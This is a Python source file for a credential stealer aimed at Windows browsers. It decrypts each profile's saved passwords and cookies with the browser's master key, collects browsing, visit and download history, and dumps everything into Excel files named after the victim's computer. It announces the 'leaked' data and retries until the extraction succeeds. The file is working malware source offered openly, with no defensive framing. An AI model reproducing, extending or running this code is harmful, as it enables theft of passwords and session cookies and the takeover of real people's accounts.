from typing import List
from victimEnvironment import victimEnvironment
from stealer import stealer
import openpyxl
import os
import time

# Create an Excel file
def createExcelFile(filename:str) -> openpyxl.Workbook:
    workbook = openpyxl.Workbook()
    workbook.save(filename)
    return workbook

def writeDataToExcelSheet(workbook:openpyxl.Workbook, workbookFilename:str, sheetname:str, header:List, data:List[List]) -> None:
    sheet = workbook.create_sheet(sheetname)
    sheet.append(header)
    for row in data:
        sheet.append(row)
    workbook.save(workbookFilename)

def payload():
    victim = victimEnvironment()
    lufevre = stealer()
    existingBrowsers:List[str] = victim.checkBrowserInstallation()

    for browser in existingBrowsers:
        print(f"[+] {browser} is installed")
        print(f"[+] master key: {victim.getMasterKey(victim.browserPath[browser])}")
        
        # get profile
        profileList:List[str] = victim.searchProfiles(victim.browserPath[browser])
        print(f"[+] {browser} has {len(profileList)} profile(s)")

        # get data
        for profile in profileList:
            outputExcelFilename = f"{os.environ['COMPUTERNAME']}_{browser}_{profile}.xlsx"
            outputExcelFile = createExcelFile(outputExcelFilename)

            print(f"[+] - Profile: {profile}")

            # get credential information
            credential = lufevre.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['loginData']['subPath']}",
                victim.browserCredentialInformation['loginData']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                lufevre.extractAndDecryptData
            )
            header = ["URL", "Username", "Password"]
            data = [[url, credential[url]["username"], credential[url]["password"]] for url in credential]
            writeDataToExcelSheet(outputExcelFile, outputExcelFilename, "Credential", header, data)

            # get history information
            history = lufevre.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['history']['subPath']}",
                victim.browserCredentialInformation['history']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                lufevre.extractHistory
            )
            header = ["URL", "Title", "VisitCount", "TypedCount", "LastVisitTime"]
            data = [[url, history[url]["title"], history[url]["visitCount"], history[url]["typedCount"], history[url]["lastVisitTime"]] for url in history]
            writeDataToExcelSheet(outputExcelFile, outputExcelFilename, "History", header, data)

            # get visited link information
            visitedLink = lufevre.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['visitedLink']['subPath']}",
                victim.browserCredentialInformation['visitedLink']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                lufevre.extractVisitedLink
            )
            header = ["TopLevelURL", "FrameURL", "VisitCount"]
            data = [[url, visitedLink[url]["frameURL"], visitedLink[url]["visitCount"]] for url in visitedLink]
            writeDataToExcelSheet(outputExcelFile, outputExcelFilename, "VisitedLink", header, data)
            

            # get cookie information
            cookie = lufevre.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['cookies']['subPath']}",
                victim.browserCredentialInformation['cookies']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                lufevre.extractCookie
            )
            header = ["HostKey", "CreationUTC", "Name", "DecryptedValue", "Path", "ExpiresUTC", "IsSecure", 
                        "IsHttpOnly", "LastAccessUTC", "HasExpires", "IsPersistent", "SameSite", "SourceScheme"]
            data = [[hostKey, cookie[hostKey]["creationUTC"], cookie[hostKey]["name"], cookie[hostKey]["decryptedValue"],
                    cookie[hostKey]["path"], cookie[hostKey]["expiresUTC"], cookie[hostKey]["isSecure"],
                    cookie[hostKey]["isHttpOnly"], cookie[hostKey]["lastAccessUTC"], cookie[hostKey]["hasExpires"],
                    cookie[hostKey]["isPersistent"], cookie[hostKey]["sameSite"], cookie[hostKey]["sourceScheme"]] for hostKey in cookie]
            writeDataToExcelSheet(outputExcelFile, outputExcelFilename, "Cookie", header, data)

            # get download history
            downloadHistory = lufevre.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['downloads']['subPath']}",
                victim.browserCredentialInformation['downloads']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                lufevre.extractDownloadHistory
            )
            header = ["CurrentPath", "TargetPath", "Referrer", "StartTime", "EndTime", "TotalBytes", 
                        "LastAccessTime", "MIMEType", "State", "DangerType", "InterruptReason"]
            data = [[currentPath, downloadHistory[currentPath]["targetPath"], downloadHistory[currentPath]["referrer"],
                    downloadHistory[currentPath]["startTime"], downloadHistory[currentPath]["endTime"], downloadHistory[currentPath]["totalBytes"],
                    downloadHistory[currentPath]["lastAccessTime"], downloadHistory[currentPath]["mimeType"], downloadHistory[currentPath]["state"],
                    downloadHistory[currentPath]["dangerType"], downloadHistory[currentPath]["interruptReason"]] for currentPath in downloadHistory]
            writeDataToExcelSheet(outputExcelFile, outputExcelFilename, "DownloadHistory", header, data)

            print(f"[+] => User password information leaked---------amount: {len(credential):-8} row(s)")
            print(f"[+] => User webpage access history leaked-------amount: {len(history):-8} row(s)")
            print(f"[+] => User webpage access statistics leaked----amount: {len(visitedLink):-8} row(s)")
            print(f"[+] => User cookie leaked-----------------------amount: {len(cookie):-8} row(s)")
            print(f"[+] => User download history leaked-------------amount: {len(downloadHistory):-8} row(s)")

    print("[+] Information extraction completed")

if __name__ == "__main__":
    while True:
        try:
            payload()
            break
        except Exception as exception:
            print(f"[-] Exception occurred during runtime: {exception}, might be due to the browser is currently running, making database access crashed")
            time.sleep(10)